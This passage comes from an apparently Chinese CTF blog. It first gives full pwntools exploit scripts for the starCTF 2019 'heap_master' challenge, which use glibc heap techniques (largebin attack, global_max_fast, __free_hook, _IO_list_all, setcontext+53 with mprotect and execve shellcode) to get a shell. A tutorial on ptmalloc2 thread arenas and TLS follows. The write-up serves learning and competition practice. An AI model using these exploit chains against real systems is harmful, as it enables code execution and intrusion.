0x7f09c5962398 &lt;main_arena+2168&gt;: 0x0000000000000001 0x0000000000021000 0x7f09c59623a8 &lt;main_arena+2184&gt;: 0x000000008b2f3000 0x00007f09c56248c0 0x7f09c56248c0 &lt;__GI___default_morecore&gt;: sub rsp,0x8 0x7f09c56248c4 &lt;__GI___default_morecore+4&gt;: call 0x7f09c5699e80 &lt;__GI___sbrk&gt; 0x7f09c56248c9 &lt;__GI___default_morecore+9&gt;: mov edx,0x0 0x7f09c56248ce &lt;__GI___default_morecore+14&gt;: cmp rax,0xffffffffffffffff 0x7f09c56248d2 &lt;__GI___default_morecore+18&gt;: cmove rax,rdx 0x7f09c56248d6 &lt;__GI___default_morecore+22&gt;: add rsp,0x8 0x7f09c56248da &lt;__GI___default_morecore+26&gt;: ret ''' p.sendline("0") # trigger on exit() time.sleep(0.1) p.send("./flag\x00") p.interactive()if __name__ == '__main__' : while True: try : exp() break except: p.close() p = process('./heap_master') 第四种方法：思路：第四种方法和前面的方法不同点主要在于劫持程序控制流，泄露的方法在前面都已经明确了，在此就不赘述。 第四种方法劫持程序执行流的方法是先改写global_fast_max，然后向free_hook放入victim的地址，然后在victim处构造一个chunk，在这个chunk的fd指针处改为system_addr，将这个chunk申请出来，这时system_addr就放入了free_hook中，然后再构造一个chunk，使其首八个字节为&#39;/bin/sh\x00&#39;，free()其即可打开shell。 exp如下(libc-2.23)：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125#coding:utf-8from pwn import *context(os='linux',arch='amd64')context.terminal = ['terminator','-x','sh','-c']#context.log_level = 'debug'p = process('./heap_master')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def new(size): p.sendlineafter('&gt;&gt; ', '1') p.sendlineafter('size: ', str(size))def upgrade(offset,content): p.sendlineafter('&gt;&gt; ', '2') p.sendlineafter('offset: ', str(offset)) p.sendlineafter('size: ', str(len(content))) p.sendafter('content: ', content) def delete(offset): p.sendlineafter('&gt;&gt; ', '3') p.sendlineafter('offset: ', str(offset))def exp(): offset = 0x5800 upgrade(offset+8,p64(0x411)) #1 upgrade(offset+8+0x410,p64(0x31)) upgrade(offset+8+0x410+0x30,p64(0x411)) #2 upgrade(offset+8+0x410+0x30+0x410,p64(0x31)) upgrade(offset+8+0x410+0x30+0x410+0x30,p64(0x201)) #3 upgrade(offset+8+0x410+0x30+0x410+0x30+0x200,p64(0x31)) upgrade(offset+8+0x410+0x30+0x410+0x30+0x200+0x30,p64(0x31)) delete(offset+0x10+0x410+0x30) delete(offset+0x10+0x410+0x30+0x410+0x30) new(0x10) upgrade(offset+8+0x410+0x30,p64(0x101)*3) upgrade(offset+8+0x410+0x30+0x100,p64(0x101)*3) upgrade(offset+8+0x410+0x30+0x100+0x100,p64(0x101)*3) delete(offset+0x20+0x410+0x30) new(0x60) delete(offset+0x10+0x410+0x30) new(0x80) new(0xf0) upgrade(offset+8+0x410+0x30,p64(0x3f1)) upgrade(offset+0x10+0x410+0x30,p64(0)+p16(0x2620-0x10)) upgrade(offset+0x20+0x410+0x30,p64(0)+p16(0x2620-0x20+0x19)) delete(offset+0x10) new(0x60) p.recv(0x18) libcbase = u64(p.recv(8)) - (0x7f1f383306e0-0x7f1f37f6d000) log.success('libcbase = '+hex(libcbase)) mmap_addr = u64(p.recv(4).ljust(8,'\x00')) - (0xb800-0x6000) log.success('mmap_addr = '+hex(mmap_addr)) #------------------------------leak success and largebin_attack again--------------- global_max_fast_addr = libcbase + (0x7f6c57ea37f8 - 0x7f6c57add000) log.success('global_max_fast_addr = '+hex(global_max_fast_addr)) offset = 0x8800 upgrade(offset+8,p64(0x511)) #1 upgrade(offset+8+0x510,p64(0x31)) upgrade(offset+8+0x510+0x30,p64(0x511)) #2 upgrade(offset+8+0x510+0x30+0x510,p64(0x31)) upgrade(offset+8+0x510+0x30+0x510+0x30,p64(0x201)) #3 upgrade(offset+8+0x510+0x30+0x510+0x30+0x200,p64(0x31)) upgrade(offset+8+0x510+0x30+0x510+0x30+0x200+0x30,p64(0x31)) delete(offset+0x10+0x510+0x30) delete(offset+0x10+0x510+0x30+0x510+0x30) new(0x10) upgrade(offset+8+0x510+0x30,p64(0x101)*3) upgrade(offset+8+0x510+0x30+0x100,p64(0x101)*3) upgrade(offset+8+0x510+0x30+0x100+0x100,p64(0x101)*3) delete(offset+0x20+0x510+0x30) new(0x60) delete(offset+0x10+0x510+0x30) new(0x80) new(0xf0) upgrade(offset+8+0x510+0x30,p64(0x4f1)) upgrade(offset+0x10+0x510+0x30,p64(0)+p64(global_max_fast_addr-0x10)) upgrade(offset+0x20+0x510+0x30,p64(0)+p64(global_max_fast_addr-0x20)) delete(offset+0x10) new(0x60) fastbin_ptr = libcbase+(0x7fc6d8510b20-0x7fc6d814c000)+8 log.success('fastbin_ptr = '+hex(fastbin_ptr)) target_addr = libcbase+libc.sym['__free_hook'] log.success('free_hook_addr ='+hex(target_addr)) idx = (target_addr-fastbin_ptr)/8 size = idx*0x10 + 0x20 offset = 0x2000 upgrade(offset+8,p64(size+1)) upgrade(offset+8+size,p64(0x31)+'/bin/sh\x00') upgrade(offset+8+size+0x30,p64(0x31)) delete(offset+0x10) upgrade(offset+8+8,p64(libcbase+libc.sym['system'])) new(size-0x10) delete(offset+size+0x10) p.interactive()if __name__ == '__main__' : while True: try : exp() break except : p.close() p = process('./heap_master') 第五种方法：思路：第五种方法也是劫持程序控制流方法不同。 第五种方法我们在泄露之后，改写_IO_list_all来控制程序控制流之后，利用_IO_str_overflow来跳到setcontext+53，然后控制寄存器调用mprotect来改写mmap段的权限，然后在mmap上注入shellcode。 exp如下(libc-2.25)：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.log_level = 'debug'context.terminal = ['terminator','-x','sh','-c']def change_ld(binary, ld): """ Force to use assigned new ld.so by changing the binary """ if not os.access(ld, os.R_OK): log.failure("Invalid path &#123;&#125; to ld".format(ld)) return None if not isinstance(binary, ELF): if not os.access(binary, os.R_OK): log.failure("Invalid path &#123;&#125; to binary".format(binary)) return None binary = ELF(binary) for segment in binary.segments: if segment.header['p_type'] == 'PT_INTERP': size = segment.header['p_memsz'] addr = segment.header['p_paddr'] data = segment.data() if size &lt;= len(ld): log.failure("Failed to change PT_INTERP from &#123;&#125; to &#123;&#125;".format(data, ld)) return None binary.write(addr, ld.ljust(size, '\x00')) if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn') path = '/tmp/pwn/&#123;&#125;_debug'.format(os.path.basename(binary.path)) if os.access(path, os.F_OK): os.remove(path) info("Removing exist file &#123;&#125;".format(path)) binary.save(path) os.chmod(path, 0b111000000) #rwx------ success("PT_INTERP has changed from &#123;&#125; to &#123;&#125;. Using temp file &#123;&#125;".format(data, ld, path)) return ELF(path)elf = change_ld('./heap_master','./ld-linux-x86-64.so.2')p = elf.process(env=&#123;'LD_PRELOAD':'./libc-2.25.so'&#125;)def new(size): p.recvuntil('&gt;&gt; ') p.sendline('1') p.recvuntil('size: ') p.sendline(str(size))def upgrade(offset,content): p.recvuntil('&gt;&gt; ') p.sendline('2') p.recvuntil('offset: ') p.sendline(str(offset)) p.recvuntil('size: ') p.sendline(str(len(content))) p.recvuntil('content: ') p.send(content)def delete(offset): p.recvuntil('&gt;&gt; ') p.sendline('3') p.recvuntil('offset: ') p.sendline(str(offset)) def mypwn(): stdout = 0x2600 libc = ELF('./libc-2.25.so') offset = 0x5800 upgrade(offset+8,p64(0x411)) #1 upgrade(offset+8+0x410,p64(0x31)) upgrade(offset+8+0x410+0x30,p64(0x411)) #2 upgrade(offset+8+0x410+0x30+0x410,p64(0x31)) upgrade(offset+8+0x410+0x30+0x410+0x30,p64(0x201)) #3 upgrade(offset+8+0x410+0x30+0x410+0x30+0x200,p64(0x31)) upgrade(offset+8+0x410+0x30+0x410+0x30+0x200+0x30,p64(0x31)) delete(offset+0x10+0x410+0x30) delete(offset+0x10+0x410+0x30+0x410+0x30) new(0x10) upgrade(offset+8+0x410+0x30,p64(0x101)*3) upgrade(offset+8+0x410+0x30+0x100,p64(0x101)*3) upgrade(offset+8+0x410+0x30+0x100+0x100,p64(0x101)*3) delete(offset+0x20+0x410+0x30) new(0x60) delete(offset+0x10+0x410+0x30) new(0x80) new(0xf0) upgrade(offset+8+0x410+0x30,p64(0x3f1)) upgrade(offset+0x10+0x410+0x30,p64(0)+p16(stdout-0x10)) upgrade(offset+0x20+0x410+0x30,p64(0)+p16(stdout-0x20+0x19)) delete(offset+0x10) new(0x60) mmap_addr = u64(p.recv(8)) - (0xdffa3800- 0xdff9e000) log.success('mmap_addr = '+hex(mmap_addr)) libcbase = u64(p.recv(8)) - (0x7f7684c72683-0x7f76848d4000) log.success('libcbase = '+hex(libcbase)) setcontext = libcbase + 0x43565 log.success('setcontext+53 = '+hex(setcontext)) dl_open_hook_addr = libcbase + (0x7fa15b2162e0-0x7fa15ae74000) log.success('dl_open_hook_addr = '+hex(dl_open_hook_addr)) offset = 0x8800 upgrade(offset+8,p64(0x511)) #1 upgrade(offset+8+0x510,p64(0x31)) upgrade(offset+8+0x510+0x30,p64(0x511)) #2 upgrade(offset+8+0x510+0x30+0x510,p64(0x31)) upgrade(offset+8+0x510+0x30+0x510+0x30,p64(0x201)) #3 upgrade(offset+8+0x510+0x30+0x510+0x30+0x200,p64(0x31)) upgrade(offset+8+0x510+0x30+0x510+0x30+0x200+0x30,p64(0x31)) delete(offset+0x10+0x510+0x30) delete(offset+0x10+0x510+0x30+0x510+0x30) new(0x10) upgrade(offset+8+0x510+0x30,p64(0x101)*3) upgrade(offset+8+0x510+0x30+0x100,p64(0x101)*3) upgrade(offset+8+0x510+0x30+0x100+0x100,p64(0x101)*3) delete(offset+0x20+0x510+0x30) new(0x60) delete(offset+0x10+0x510+0x30) new(0x80) new(0xf0) upgrade(offset+8+0x510+0x30,p64(0x4f1)) upgrade(offset+0x10+0x510+0x30,p64(0)+p64(dl_open_hook_addr-0x10)) upgrade(offset+0x20+0x510+0x30,p64(0)+p64(dl_open_hook_addr-0x20)) delete(offset+0x10) new(0x60) ''' 0x7ffff7a7a565 &lt;setcontext+53&gt;: mov rsp,QWORD PTR [rdi+0xa0] 0x7ffff7a7a56c &lt;setcontext+60&gt;: mov rbx,QWORD PTR [rdi+0x80] 0x7ffff7a7a573 &lt;setcontext+67&gt;: mov rbp,QWORD PTR [rdi+0x78] 0x7ffff7a7a577 &lt;setcontext+71&gt;: mov r12,QWORD PTR [rdi+0x48] 0x7ffff7a7a57b &lt;setcontext+75&gt;: mov r13,QWORD PTR [rdi+0x50] 0x7ffff7a7a57f &lt;setcontext+79&gt;: mov r14,QWORD PTR [rdi+0x58] 0x7ffff7a7a583 &lt;setcontext+83&gt;: mov r15,QWORD PTR [rdi+0x60] 0x7ffff7a7a587 &lt;setcontext+87&gt;: mov rcx,QWORD PTR [rdi+0xa8] 0x7ffff7a7a58e &lt;setcontext+94&gt;: push rcx 0x7ffff7a7a58f &lt;setcontext+95&gt;: mov rsi,QWORD PTR [rdi+0x70] 0x7ffff7a7a593 &lt;setcontext+99&gt;: mov rdx,QWORD PTR [rdi+0x88] 0x7ffff7a7a59a &lt;setcontext+106&gt;: mov rcx,QWORD PTR [rdi+0x98] 0x7ffff7a7a5a1 &lt;setcontext+113&gt;: mov r8,QWORD PTR [rdi+0x28] 0x7ffff7a7a5a5 &lt;setcontext+117&gt;: mov r9,QWORD PTR [rdi+0x30] 0x7ffff7a7a5a9 &lt;setcontext+121&gt;: mov rdi,QWORD PTR [rdi+0x68] 0x7ffff7a7a5ad &lt;setcontext+125&gt;: xor eax,eax 0x7ffff7a7a5af &lt;setcontext+127&gt;: ret rsp = [rdi+0xa0] ret_addr = [rdi+0xa8] #push rcx; ......... ret; 开始的rcx作为缓冲区，必须装指令的地址。 rsi = [rdi+0x70] rdx = [rdi+0x88] rcx = [rdi+0x98] r8 = [rdi+0x28] r9 = [rdi+0x30] ''' mygadget = 0x7fd7d + libcbase #0x000000000007fd7d: mov rdi, qword ptr [rbx + 0x48]; mov rsi, r13; call qword ptr [rbx + 0x40]; shellcode = '\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05' upgrade(offset,p64(mygadget)) upgrade(offset+0x40,p64(setcontext)+p64(mmap_addr+0x1000)) upgrade(0x1000+0xa0,p64(mmap_addr+0x2000)+p64(libcbase+libc.sym['mprotect'])) upgrade(0x1000+0x68,p64(mmap_addr+0x2000)+p64(0x1000)) #rdi rsi upgrade(0x1000+0x88,p64(7)) #rdx upgrade(0x2000,p64(mmap_addr+0x2008)+shellcode) delete(0x10) p.interactive()while True: try: mypwn() break except: p.close() elf = change_ld('./heap_master','./ld-linux-x86-64.so.2') p = elf.process(env=&#123;'LD_PRELOAD':'./libc-2.25.so'&#125;) 总结：唉，其实一路看下来的话其实所谓的多解就是两种泄露方式和三四种劫持程序控制流的方式进行排列组合罢了，融会贯通了其实五种方法就是一种方法。 leak方式： 改写stdout流的关键字节，使flag过了检查f-&gt;flag &amp; 0xa00 and f-&gt;flag &amp; 0x1000 == 1，并且_IO_write_base!=_IO_write_ptr。 在我们可控的地址上劫持伪造stdout流。 modify方式： 改写dl_open_hook，获得一次任意地址call的机会，然后配合setcontext+53控制寄存器，在malloc或者free出错，调用malloc_printerr时会trigger。 改写_IO_list_all，伪造_IO_FIFE_plus结构体，将vtable改为_IO_str_jumps的地址，然后在_IO_str_overflow或者_IO_str_finish里进行劫持。（malloc printerr/exit()/main return-&gt;__libc_message-&gt;abort-&gt;_IO_flush_all_lockp-&gt;_IO_str_overflow/_IO_str_finish），需要过一系列fflush的检查，固定构造已经在前面给出。 改写global_max_fast，突破fastbinY[]的限制，像任意（几乎）地址写victim的地址，可以改写某个hook来进行进一步操作。 参考资料：深入分析 IO_FILE 与 Unosrtbin Largebin attack 的结合利用 starctf-heap_master题解–e3pem Startctf2019_Heap_master–n132 JarvisOJ Pwn Writeup–m4x Largebin学习–veritas501 global_max_fast学习–raycp 新手向——IO_file全流程浅析 (这篇文章里在分析_IO_str_overflow时有错误orz，可能会误导人。)]]></content>
      <categories>
        <category>CTF-PWN</category>
      </categories>
      <tags>
        <tag>WP</tag>
        <tag>summary</tag>
        <tag>starCTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[多线程pwn学习与总结]]></title>
    <url>%2F2019%2F06%2F22%2F%E5%A4%9A%E7%BA%BF%E7%A8%8Bpwn%E5%AD%A6%E4%B9%A0%E4%B8%8E%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[因为近期为了获得参加暑假方班夏令营的资格去digapis的平台上刷题，有幸做到了T3LS大佬出的girlfriend这题，这题我做了很久orz，查了很多资料，出的很巧妙，也是我第一次碰到多线程的题目，又谷歌了一下，发现多线程的题目在高端局中出现的并不低。。。所以参考了一大波师傅们的blog加上好几天的谷歌，决定来总结一下。 对于ptmalloc2中多线程方面的知识：在早期的 Linux 里，dlmalloc被用做默认的内存分配器。但之后因为ptmalloc2添加了线程支持，ptmalloc2成为了Linux默认内存分配器。线程支持可帮助提升内存分配器以及应用程序的性能。在dlmalloc里，当两个线程同时调用malloc时，只有一个线程能进入到临界段，因为这里的free list是所有可用线程共用的。因此内存分配器要在多线程应用里耗费时间，从而导致性能降低。 ptmalloc2中，当多个线程同时调用malloc，内存会立即得到分配，因为每个线程有一个单独的arena，因此free list数据结构中（在ptmalloc2中是bins）保存的这些堆也是分开的。这种为每个线程分配一个单独的arena和free list数据结构（bins）的行为称为per thread arena。 两个基本函数：pthread_create所有线程都有一个线程号，也就是Thread ID。其类型为pthread_t。 通过创建线程，线程将会执行一个线程函数，该线程格式必须按照下面来声明： ​ void * Thread_Function(void *) 创建线程的函数如下： ​ int pthread_create(pthread_t *restrict thread，const pthread_attr_t *restrict attr，void *(*start_routine)(void*)，void *restrict arg)； 下面说明一下各个参数的含义： thread：所创建的线程号。（返回的进程号将储存在thread变量里。） attr：所创建的线程属性，这个之后会提一下。 start_routine：即将运行的线程函数。 arg：传递给线程函数的参数。 在编译的时候需要注意，由于线程创建函数不是linux默认的库，而在libpthread.so库中，所以在编译命令中需要将该库导入（-lpthread）。命令如下： gcc –o createthread –lpthread createthread.c 如果想传递参数给线程函数，可以通过其参数arg，其类型是void 。如果你需要传递多个参数的话，可以考虑将这些参数组成一个结构体来传递。另外，由于类型是void ，所以你的参数不可以被提前释放掉。 pthread_join如果你的主线程，也就是main函数执行的那个线程，在你其他县城推出之前就已经退出，那么带来的bug则不可估量。通过pthread_join函数会让主线程阻塞，直到所有线程都已经退出。 int pthread_join(pthread_t thread, void **value_ptr); thread：等待退出线程的线程号。 value_ptr：退出线程的返回值。 看一个demo: 1234567891011121314151617181920212223242526int main ()&#123; pthread_t thread1_id; pthread_t thread2_id; struct char_print_parms thread1_args; //多个变量用结构体传参 struct char_print_parms thread2_args; //同上 /* Create a new thread to print 30,000 x’s. */ thread1_args.character = ’x’; thread1_args.count = 30000; pthread_create (&amp;thread1_id, NULL, &amp;char_print, &amp;thread1_args); /* Create a new thread to print 20,000 o’s. */ thread2_args.character = ’o’; thread2_args.count = 20000; pthread_create (&amp;thread2_id, NULL, &amp;char_print, &amp;thread2_args); /* Make sure the first thread has finished. */ pthread_join (thread1_id, NULL); /* Make sure the second thread has finished. */ pthread_join (thread2_id, NULL); /* Now we can safely return. */ return 0;&#125; 下面说一下前面提到的线程属性。 在我们前面提到，可以通过pthread_join()函数来使主线程阻塞等待其他线程退出，这样主线程可以清理其他线程的环境。但是还有一些线程，更喜欢自己来清理退出的状态，他们也不愿意主线程调用pthread_join来等待他们。我们将这一类线程的属性称为detached。如果我们在调用pthread_create()函数的时候将属性设置为NULL，则表明我们希望所创建的线程采用默认的属性，也就是jionable。如果需要将属性设置为detached。 最后说一下线程的本质。其实在Linux中，新建的线程并不是在原先的进程中，而是系统通过一个系统调用clone()。该系统copy了一个和原先进程完全一样的进程，并在这个进程中执行线程函数。不过这个copy过程和fork不一样。copy后的进程和原先的进程共享了所有的变量，运行环境。这样，原先进程中的变量变动在copy后的进程中便能体现出来。这意味着线程可以改动全局变量而使主进程中某个条件成立。 一个线程创建前后的内存环境分析：一个demo:（来自于深入理解glibc-malloc） 123456789101112131415161718192021222324252627282930313233343536373839404142434445/* Per thread arena example. */#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;pthread.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;void* threadFunc(void* arg) &#123; printf("Before malloc in thread 1\n"); getchar(); char* addr = (char*) malloc(1000); printf("After malloc and before free in thread 1\n"); getchar(); free(addr); printf("After free in thread 1\n"); getchar();&#125;int main() &#123; pthread_t t1; void* s; int ret; char* addr; printf("Welcome to per thread arena example::%d\n",getpid()); printf("Before malloc in main thread\n"); getchar(); addr = (char*) malloc(1000); printf("After malloc and before free in main thread\n"); getchar(); free(addr); printf("After free in main thread\n"); getchar(); ret = pthread_create(&amp;t1, NULL, threadFunc, NULL); if (ret) &#123; printf("Thread creation error\n"); return -1; &#125; ret = pthread_join(t1, &amp;s); if (ret) &#123; printf("Thread join error\n"); return -1; &#125; return 0;&#125; 如果我们一步一步调试会发现： 当主线程用malloc(1000)向ptmalloc2申请内存时会系统调用brk，操作系统会给主线程分配132k/0x21000大小的heap区域，这块区域叫main arena。 主线程free()以后，这一块内存会放进main arena的bin中。 当创建线程之后，线程调用malloc(1000)时，malloc()会系统调用mmap()给线程分配132k/0x21000的heap区域，这块区域叫thread arena。（当申请的内存大小大于128k/0x20000时，无论是主线程还是线程都会系统调用mmap()分配内存。） 线程free()以后这一块内存会放进thread arena的bin中。 印证了上面所说：为每个线程分配一个单独的arena和free list数据结构（bins）。 Arena的数量限制arena的数量由系统的核数量决定。 32位系统：arena的数量 = 2 核的数量64位系统：arena的数量 = 8 核的数量 Multiple Arena(arena的空间复用)例如：一个多线程（主线程+7个用户线程）应用在一个单核的64位系统上运行，线程数&gt;8*核数，因此glibc malloc需要确保multiple arena能被线程共享。 主线程第一次调用malloc会创建main arena。 thread1和thread2第一次调用malloc，会分别为它们创建thread arena thread3第一次调用malloc不会创建arena，会尝试reuse已存在的arena（main arena或arena1或arena2） reuse：当循环可用的arena时，尝试lock arena如果lock成功，返回那个arena给用户如果没有空闲的arena，阻塞排队等待arena Multiple Heapsglibc malloc中有三种数据结构：heap_info Heap Header - 一个thread arena可以有multiple heaps，每个heap有自己的header。（每个thread arena一开始只有一个heap，当堆段空间用尽时，会有新的heap被mmap到这个arena中）malloc_state Arena Header - 一个thread arena的multiple heaps只有一个arena header。Arena header包含着bins，top chunk，last remainder chunk等信息。 123456789101112131415161718192021222324252627282930313233343536373839struct malloc_state&#123; /* Serialize access. */ mutex_t mutex; /* Flags (formerly in max_fast). */ int flags; /* Fastbins */ mfastbinptr fastbinsY[NFASTBINS]; /* Base of the topmost chunk -- not otherwise kept in a bin */ mchunkptr top;//此地址将被写入_IO_list_all /* The remainder from the most recent split of a small request */ mchunkptr last_remainder; /* Normal bins packed as described above */ mchunkptr bins[NBINS * 2 - 2]; /* Bitmap of bins */ unsigned int binmap[BINMAPSIZE]; /* Linked list */ struct malloc_state *next; /* Linked list for free arenas. Access to this field is serialized by free_list_lock in arena.c. */ struct malloc_state *next_free; /* Number of threads attached to this arena. 0 if the arena is on the free list. Access to this field is serialized by free_list_lock in arena.c. */ INTERNAL_SIZE_T attached_threads; /* Memory allocated from the system in this arena. */ INTERNAL_SIZE_T system_mem; INTERNAL_SIZE_T max_system_mem;&#125;; malloc_chunk Chunk Header - 一个heap根据用户请求被分成多个chunk，每个chunk有自己的header。 Main arena没有multiple heaps，因此没有heap_info结构。当main arena空间用尽时，sbrk创建的堆段会被增长（连续空间），直到它撞到内存映射段。和thread arena不同，main arena的arena header不是sbrk创建的堆段的一部分，它是一个全局变量，因此它在libc.so的数据段。 main arena和thread arena（单个堆段）thread arena（多个堆段） TLS：线程本地存储又叫线程局部存储，其英文为Thread Local Storage，简称TLS，看似一个很高大上的东西，其实就是线程私有的全局变量而已。 普通的全局变量在多线程中是共享的，一个线程对其进行了修改，所有线程都可以看到这个修改，而线程私有的全局变量与普通全局变量不同，线程私有全局变量是线程的私有财产，每个线程都有自己的一份副本，某个线程对其所做的修改只会修改到自己的副本，并不会修改到其它线程的副本。 下面用例子来说明一下多线程共享全局变量以及线程私有全局变量之间的差异，并对gcc的线程本地存储做一个简单的分析。 首先来看普通的全局变量 123456789101112131415161718192021222324252627#include &lt;stdio.h&gt;#include &lt;pthread.h&gt;int g = 0; // 1，定义全局变量g并赋初值0void* start(void* arg)&#123; printf("start, g[%p] : %d\n", &amp;g, g); // 4，子线程中打印全局变量g的地址和值 g++; // 5，修改全局变量 return NULL;&#125;int main(int argc, char* argv[])&#123; pthread_t tid; g = 100; // 2，主线程给全局变量g赋值为100 pthread_create(&amp;tid, NULL, start, NULL); // 3， 创建子线程执行start()函数 pthread_join(tid, NULL); // 6，等待子线程运行结束 printf("main, g[%p] : %d\n", &amp;g, g); // 7，打印全局变量g的地址和值 return 0;&#125; 注释已经写的很清晰明了，我们的目的是看线程中的g++会不会影响我们最开始定义的全局变量g，输出结果为： xiaoxiaorenwu@ubuntu:~/study/c$ gcc thread.c -o thread -lpthreadxiaoxiaorenwu@ubuntu:~/study/c$ ./threadstart, g[0x601064] : 100main, g[0x601064] : 101 从输出结果我们可以看到，普通全局变量g在主线程和其他线程中储存地址都是一样的，任何一个线程都可以对这个全局变量进行读取和修改，实现了变量的共享。 了解了普通的全局变量之后我们再来看通过线程本地存储(TLS)实现的线程私有全局变量。这个程序与上面的程序几乎完全一样，唯一的差别就是在定义全局变量 g 时增加了 __thread关键字，这样g就变成了线程私有全局变量了。 123456789101112131415161718192021222324252627#include &lt;stdio.h&gt;#include &lt;pthread.h&gt;__thread int g = 0; // 1，这里增加了__thread关键字，把g定义成私有的全局变量，每个线程都有一个g变量void* start(void* arg)&#123; printf("start, g[%p] : %d\n", &amp;g, g); // 4，打印本线程私有全局变量g的地址和值 g++; // 5，修改本线程私有全局变量g的值 return NULL;&#125;int main(int argc, char* argv[])&#123; pthread_t tid; g = 100; // 2，主线程给私有全局变量赋值为100 pthread_create(&amp;tid, NULL, start, NULL); // 3，创建子线程执行start()函数 pthread_join(tid, NULL); // 6，等待子线程运行结束 printf("main, g[%p] : %d\n", &amp;g, g); // 7，打印主线程的私有全局变量g的地址和值 return 0;&#125; 输出结果为： xiaoxiaorenwu@ubuntu:~/study/c$ gcc -g thread.c -o thread -lpthreadxiaoxiaorenwu@ubuntu:~/study/c$ ./threadstart, g[0x7f0181b046fc] : 0main, g[0x7f01823076fc] : 100 我们可以发现两个问题，一个是g这个全局变量在主线程和其他线程中的地址不一样了，还有就是线程中对g进行修改并不能影响主线程中的g（这不是废话么。。。地址都不一样。。），说明每个线程都有一个自己私有的全局变量g。 我们来用gdb分析一下： 首先在源代码的第20行（对应到源代码中的 g = 100）处下一个断点，然后运行程序，程序停在了断点处，反汇编一下main函数： 12345678910111213141516171819202122232425262728293031323334(gdb) b thread.c:20Breakpoint1at0x400793:filethread.c, line 20.(gdb) rStartingprogram:/home/bobo/study/c/threadBreakpoint1, at thread.c:2020 g=100;(gdb) disassDumpofassemblercodeforfunctionmain: 0x0000000000400775&lt;+0&gt;:push %rbp 0x0000000000400776&lt;+1&gt;:mov %rsp,%rbp 0x0000000000400779&lt;+4&gt;:sub $0x20,%rsp 0x000000000040077d&lt;+8&gt;:mov %edi,-0x14(%rbp) 0x0000000000400780&lt;+11&gt;:mov %rsi,-0x20(%rbp) 0x0000000000400784&lt;+15&gt;:mov %fs:0x28,%rax 0x000000000040078d&lt;+24&gt;:mov %rax,-0x8(%rbp) 0x0000000000400791&lt;+28&gt;:xor %eax,%eax=&gt; 0x0000000000400793 &lt;+30&gt;:movl $0x64,%fs:0xfffffffffffffffc 0x000000000040079f&lt;+42&gt;:lea -0x10(%rbp),%rax 0x00000000004007a3&lt;+46&gt;:mov $0x0,%ecx 0x00000000004007a8&lt;+51&gt;:mov $0x400736,%edx 0x00000000004007ad&lt;+56&gt;:mov $0x0,%esi 0x00000000004007b2&lt;+61&gt;:mov %rax,%rdi 0x00000000004007b5&lt;+64&gt;:callq 0x4005e0 &lt;pthread_create@plt&gt; 0x00000000004007ba&lt;+69&gt;:mov -0x10(%rbp),%rax 0x00000000004007be&lt;+73&gt;:mov $0x0,%esi 0x00000000004007c3&lt;+78&gt;:mov %rax,%rdi 0x00000000004007c6&lt;+81&gt;:callq 0x400620 &lt;pthread_join@plt&gt; 0x00000000004007cb&lt;+86&gt;:mov %fs:0xfffffffffffffffc,%eax 0x00000000004007d3&lt;+94&gt;:mov %eax,%esi 0x00000000004007d5&lt;+96&gt;:mov $0x4008df,%edi 0x00000000004007da&lt;+101&gt;:mov $0x0,%eax 0x00000000004007df&lt;+106&gt;:callq 0x400600 &lt;printf@plt&gt; ...... 程序停在了g = 100这一行，看一下汇编指令， 1=&gt; 0x0000000000400793 &lt;+30&gt;:movl $0x64,%fs:0xfffffffffffffffc 这句汇编指令的意思是把常量100(0x64)复制到地址为%fs:0xfffffffffffffffc的内存中，可以看出全局变量g的地址为%fs:0xfffffffffffffffc，fs是段寄存器，0xfffffffffffffffc是有符号数-4，所以全局变量g的地址为： fs段基址 - 4 前面我们在讲段寄存器时说过段基址就是段的起始地址，为了验证g的地址确实是fs段基址 - 4，我们需要知道fs段基址是多少，虽然我们可以用gdb命令查看fs寄存器的值，但fs寄存器里面存放的是段选择子（segment selector）而不是该段的起始地址，为了拿到这个基地址，我们需要加一点代码来获取它，修改后的代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;pthread.h&gt;#include &lt;asm/prctl.h&gt;#include &lt;sys/prctl.h&gt;__thread int g = 0;void print_fs_base()&#123; unsigned long addr; int ret = arch_prctl(ARCH_GET_FS, &amp;addr); //获取fs段基地址 if (ret &lt; 0) &#123; perror("error"); return; &#125; printf("fs base addr: %p\n", (void*)addr); //打印fs段基址 return;&#125;void* start(void* arg)&#123; print_fs_base(); //子线程打印fs段基地址 printf("start, g[%p] : %d\n", &amp;g, g); g++; return NULL;&#125;int main(int argc, char* argv[])&#123; pthread_t tid; g = 100; pthread_create(&amp;tid, NULL, start, NULL); pthread_join(tid, NULL); print_fs_base(); //main线程打印fs段基址 printf("main, g[%p] : %d\n", &amp;g, g); return 0;&#125; 代码中主线程和子线程都分别调用了print_fs_base()函数用于打印fs段基地址，运行程序看一下： fs base addr: 0x7f36757c8700start, g[0x7f36757c86fc] : 0fs base addr: 0x7f3675fcb700main, g[0x7f3675fcb6fc] : 100 可以看到： 子线程fs段基地址为0x7f36757c8700，g的地址为0x7f36757c86fc，它正好是基地址 - 4 主线程fs段基地址为0x7f3675fcb700，g的地址为0x7f3675fcb6fc，它也是基地址 - 4 由此可以得出，gcc编译器（其实还有线程库以及内核的支持）使用了CPU的fs段寄存器来实现线程本地存储，不同的线程中fs段基地址是不一样的，这样看似同一个全局变量但在不同线程中却拥有不同的内存地址，实现了线程私有的全局变量。 了解了这么多，我们可以开始着手开始解决girlfriend了 